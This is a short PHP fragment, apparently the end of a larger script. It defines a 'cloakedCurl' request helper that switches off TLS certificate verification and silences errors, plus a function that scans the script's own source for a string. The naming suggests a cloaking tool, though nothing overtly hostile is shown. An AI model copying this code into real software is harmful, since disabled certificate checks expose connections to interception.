function cloakedCurl($url,$body='',$returnHeaders=false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    if(!empty($body)) curl_setopt($ch, CURLOPT_POST, 1);
    if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($ch);
    curl_close ($ch);
    return $r;
}
function cloakedEditor($s){
    $f=file($_SERVER["SCRIPT_FILENAME"]);
    $r=0;
    foreach ($f as $n=>$l){if(strstr($l,$s)) {$r=$n;break;}}
    return $r+1;
}
die();
?>